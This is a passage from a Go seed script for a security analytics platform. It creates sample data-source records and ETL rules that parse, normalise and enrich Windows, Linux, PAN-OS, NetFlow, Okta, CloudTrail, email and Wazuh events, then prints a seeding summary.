		{"Legacy AD SIEM", "Legacy on-prem SIEM forwarding AD events via syslog.", "syslog", model.DataSourceStatusError, 0, 96.0,
			[]string{"identity", "legacy"}, map[string]any{"host": "10.0.2.5", "port": 514, "error": "connection refused"}},
		{"Vulnerability Scanner (Tenable)", "Tenable.io scan results via REST API.", "api", model.DataSourceStatusActive, 4201, 24.0,
			[]string{"vulnerability"}, map[string]any{"api_url": "https://cloud.tenable.com", "scan_frequency": "daily"}},
		{"Network DLP Sensor", "DLP events from network tap (currently disabled).", "netflow", model.DataSourceStatusInactive, 2819, 168.0,
			[]string{"dlp", "network"}, map[string]any{"interface": "eth2"}},
	}
	for _, s := range dsSpecs {
		ds := &model.DataSource{
			TenantID:    tenantID,
			Name:        s.name,
			Description: s.desc,
			Type:        s.typ,
			Status:      s.status,
			Config:      s.config,
			Tags:        s.tags,
			EventCount:  s.eventCount,
			LastEventAt: lastEvt(s.lastEvtHours),
			CreatedAt:   now.Add(-90 * 24 * time.Hour),
			UpdatedAt:   now,
		}
		must("datasource "+s.name, dsRepo.Create(ctx, ds))
	}
	fmt.Printf("seeded %d datasources\n", len(dsSpecs))

	// ── 21. ETL Rules — pipeline transformation rules ────────────────────────
	// These are loaded by the ETL RuleEngine at startup (FindEnabledForTenant).
	// Priority: lower = evaluated first (first-match-wins).
	truncate(ctx, database, "etl_rules")
	etlRepo := repository.NewETLRuleRepo(database)
	type etlSpec struct {
		ruleID, name, desc string
		priority           int
		isEnabled          bool
		rawWriteMode       model.RawWriteMode
		match              model.ETLMatchCriteria
		actions            []model.ETLAction
		output             model.ETLOutput
	}
	etlSpecs := []etlSpec{
		// Priority 100: enrich all Windows endpoint events with asset + threat lookups
		{
			ruleID: "win-endpoint-enrich", priority: 100, isEnabled: true,
			name:         "Windows Endpoint Enrichment",
			desc:         "Enrich all Windows endpoint events: asset context + threat intel IOC lookup. Writes to ngx 'endpoint_enriched' index and ArangoDB.",
			rawWriteMode: model.RawWriteBoth,
			match: model.ETLMatchCriteria{
				TagPattern: "winevent.*",
				Dataset:    []string{string(model.DatasetEndpoint)},
			},
			actions: []model.ETLAction{
				{Type: model.ETLActionLookupAsset},
				{Type: model.ETLActionLookupThreat},
				{Type: model.ETLActionSetField, Params: map[string]any{"field": "platform", "value": "windows"}},
			},
			output: model.ETLOutput{NgxIndex: "endpoint_enriched", WriteArango: true},
		},
		// Priority 110: enrich Linux endpoint events similarly
		{
			ruleID: "linux-endpoint-enrich", priority: 110, isEnabled: true,
			name:         "Linux Endpoint Enrichment",
			desc:         "Enrich Linux sysmon/syslog endpoint events with asset context and threat IOC lookup.",
			rawWriteMode: model.RawWriteBoth,
			match: model.ETLMatchCriteria{
				TagPattern: "linux.*",
				Dataset:    []string{string(model.DatasetEndpoint)},
			},
			actions: []model.ETLAction{
				{Type: model.ETLActionLookupAsset},
				{Type: model.ETLActionLookupThreat},
				{Type: model.ETLActionSetField, Params: map[string]any{"field": "platform", "value": "linux"}},
			},
			output: model.ETLOutput{NgxIndex: "endpoint_enriched", WriteArango: true},
		},
		// Priority 200: parse PAN-OS CEF syslog into structured fields
		{
			ruleID: "panos-cef-parse", priority: 200, isEnabled: true,
			name:         "Palo Alto PAN-OS CEF Parser",
			desc:         "Parse CEF-formatted PAN-OS syslog into structured network event fields, then enrich with asset lookup.",
			rawWriteMode: model.RawWriteBoth,
			match: model.ETLMatchCriteria{
				TagPattern: "syslog.panos.*",
				Dataset:    []string{string(model.DatasetNetwork)},
			},
			actions: []model.ETLAction{
				{Type: model.ETLActionGrok, Params: map[string]any{
					"src_field": "message",
					"pattern":   `CEF:0\|(?P<vendor>[^|]+)\|(?P<product>[^|]+)\|(?P<version>[^|]+)\|(?P<sig_id>[^|]+)\|(?P<name>[^|]+)\|(?P<sev>[^|]+)\|(?P<ext>.+)`,
				}},
				{Type: model.ETLActionParseJSON, Params: map[string]any{"src_field": "ext"}},
				{Type: model.ETLActionLookupAsset},
				{Type: model.ETLActionSetDataset, Params: map[string]any{"dataset": string(model.DatasetNetwork)}},
			},
			output: model.ETLOutput{NgxIndex: "network_panos", WriteArango: true},
		},
		// Priority 210: enrich Cisco NetFlow with asset lookup, route to network index
		{
			ruleID: "netflow-enrich", priority: 210, isEnabled: true,
			name:         "NetFlow Asset Enrichment",
			desc:         "Enrich NetFlow v9 records with src/dst asset context from the asset inventory.",
			rawWriteMode: model.RawWriteETLOnly,
			match: model.ETLMatchCriteria{
				TagPattern: "netflow.*",
				Dataset:    []string{string(model.DatasetNetwork)},
			},
			actions: []model.ETLAction{
				{Type: model.ETLActionLookupAsset},
				{Type: model.ETLActionSetField, Params: map[string]any{"field": "source_type", "value": "netflow"}},
			},
			output: model.ETLOutput{NgxIndex: "network_flows", WriteArango: false},
		},
		// Priority 300: normalise Okta identity events into standard identity schema
		{
			ruleID: "okta-identity-normalise", priority: 300, isEnabled: true,
			name:         "Okta Identity Event Normalisation",
			desc:         "Rename Okta-specific field names to the XSIAM standard identity event schema.",
			rawWriteMode: model.RawWriteBoth,
			match: model.ETLMatchCriteria{
				TagPattern: "okta.*",
				Dataset:    []string{string(model.DatasetIDP), string(model.DatasetIdentity)},
			},
			actions: []model.ETLAction{
				{Type: model.ETLActionRenameField, Params: map[string]any{"from": "actor.id", "to": "user_id"}},
				{Type: model.ETLActionRenameField, Params: map[string]any{"from": "actor.displayName", "to": "username"}},
				{Type: model.ETLActionRenameField, Params: map[string]any{"from": "client.ipAddress", "to": "src_ip"}},
				{Type: model.ETLActionSetField, Params: map[string]any{"field": "provider", "value": "okta"}},
				{Type: model.ETLActionSetDataset, Params: map[string]any{"dataset": string(model.DatasetIdentity)}},
			},
			output: model.ETLOutput{NgxIndex: "identity_okta", WriteArango: true},
		},
		// Priority 310: normalise AWS CloudTrail events
		{
			ruleID: "cloudtrail-normalise", priority: 310, isEnabled: true,
			name:         "AWS CloudTrail Normalisation",
			desc:         "Flatten CloudTrail nested JSON (userIdentity, requestParameters) into top-level fields.",
			rawWriteMode: model.RawWriteBoth,
			match: model.ETLMatchCriteria{
				TagPattern: "aws.cloudtrail.*",
				Dataset:    []string{string(model.DatasetCloud)},
			},
			actions: []model.ETLAction{
				{Type: model.ETLActionRenameField, Params: map[string]any{"from": "userIdentity.arn", "to": "user_arn"}},
				{Type: model.ETLActionRenameField, Params: map[string]any{"from": "userIdentity.userName", "to": "username"}},
				{Type: model.ETLActionRenameField, Params: map[string]any{"from": "sourceIPAddress", "to": "src_ip"}},
				{Type: model.ETLActionRenameField, Params: map[string]any{"from": "eventName", "to": "action"}},
				{Type: model.ETLActionSetField, Params: map[string]any{"field": "provider", "value": "aws"}},
			},
			output: model.ETLOutput{NgxIndex: "cloud_aws", WriteArango: true},
		},
		// Priority 400: drop noisy health-check and heartbeat events
		{
			ruleID: "drop-heartbeats", priority: 400, isEnabled: true,
			name:         "Drop Agent Heartbeats",
			desc:         "Discard agent heartbeat and health-check pings — they contain no security value.",
			rawWriteMode: model.RawWriteRawOnly,
			match: model.ETLMatchCriteria{
				TagPattern: "*.heartbeat",
				FilterExpr: "event_type=heartbeat",
			},
			actions: []model.ETLAction{
				{Type: model.ETLActionDropEvent},
			},
			output: model.ETLOutput{NgxIndex: "", WriteArango: false},
		},
		// Priority 500: enrich email events with threat intel, route to email index
		{
			ruleID: "email-threat-enrich", priority: 500, isEnabled: true,
			name:         "Email Event Threat Enrichment",
			desc:         "Enrich email delivery and click events with sender IP reputation from threat intel.",
			rawWriteMode: model.RawWriteBoth,
			match: model.ETLMatchCriteria{
				Dataset: []string{string(model.DatasetEmail)},
			},
			actions: []model.ETLAction{
				{Type: model.ETLActionLookupThreat},
				{Type: model.ETLActionSetField, Params: map[string]any{"field": "source_type", "value": "email"}},
			},
			output: model.ETLOutput{NgxIndex: "email_events", WriteArango: true},
		},
		// Priority 600: Wazuh syslog — parse JSON body, rename fields, enrich
		{
			ruleID: "wazuh-syslog-parse", priority: 600, isEnabled: true,
			name:         "Wazuh SIEM Event Parser",
			desc:         "Parse Wazuh manager syslog JSON alerts into structured XSIAM endpoint events.",
			rawWriteMode: model.RawWriteBoth,
			match: model.ETLMatchCriteria{
				TagPattern: "syslog.wazuh.*",
				Dataset:    []string{string(model.DatasetEndpoint)},
			},
			actions: []model.ETLAction{
				{Type: model.ETLActionParseJSON, Params: map[string]any{"src_field": "message"}},
				{Type: model.ETLActionRenameField, Params: map[string]any{"from": "agent.name", "to": "hostname"}},
				{Type: model.ETLActionRenameField, Params: map[string]any{"from": "agent.ip", "to": "src_ip"}},
				{Type: model.ETLActionRenameField, Params: map[string]any{"from": "rule.description", "to": "event_description"}},
				{Type: model.ETLActionLookupAsset},
				{Type: model.ETLActionSetField, Params: map[string]any{"field": "platform", "value": "linux"}},
			},
			output: model.ETLOutput{NgxIndex: "endpoint_wazuh", WriteArango: true},
		},
		// Priority 900: catch-all — enrich remaining events with asset lookup only (disabled by default)
		{
			ruleID: "catch-all-asset-enrich", priority: 900, isEnabled: false,
			name:         "Catch-All Asset Enrichment (disabled)",
			desc:         "Fallback rule: enrich any unmatched event with asset lookup. Disabled by default — enable only when all other rules are configured.",
			rawWriteMode: model.RawWriteBoth,
			match:        model.ETLMatchCriteria{TagPattern: "*"},
			actions: []model.ETLAction{
				{Type: model.ETLActionLookupAsset},
			},
			output: model.ETLOutput{NgxIndex: "events_raw_enriched", WriteArango: false},
		},
	}
	etlCount := 0
	for _, s := range etlSpecs {
		rule := &model.ETLRule{
			RuleID:       s.ruleID,
			TenantID:     tenantID,
			Name:         s.name,
			Description:  s.desc,
			IsEnabled:    s.isEnabled,
			Priority:     s.priority,
			Match:        s.match,
			RawWriteMode: s.rawWriteMode,
			Actions:      s.actions,
			Output:       s.output,
			CreatedBy:    "admin",
			CreatedAt:    now.Add(-30 * 24 * time.Hour),
			UpdatedAt:    now,
		}
		must("etl_rule "+s.ruleID, etlRepo.Create(ctx, rule))
		etlCount++
	}
	fmt.Printf("seeded %d etl_rules (%d enabled)\n", etlCount, etlCount-1) // catch-all is disabled

	// Summary
	_ = ruleKeys
	fmt.Printf("\n✓ seed complete\n")
	fmt.Printf("  assets=%d vulns=%d iocs=%d feeds=%d rules=%d alerts=%d incidents=%d devices=%d playbooks=%d actions=%d logs=%d identity_risks=%d exposure_scores=%d causality_graphs=%d reports=%d policies=%d datasources=%d etl_rules=%d\n",
		len(assetSpecs), len(vulnSpecs), len(iocSpecs), len(feedSpecs),
		len(ruleSpecs), len(alertSpecs), len(incSpecs),
		len(deviceSpecs), len(pbSpecs), len(actionSpecs), logCount,
		len(identitySpecs), len(exposureSpecs), causalityCount,
		len(reportSpecs), len(policySpecs), len(dsSpecs), etlCount)
}
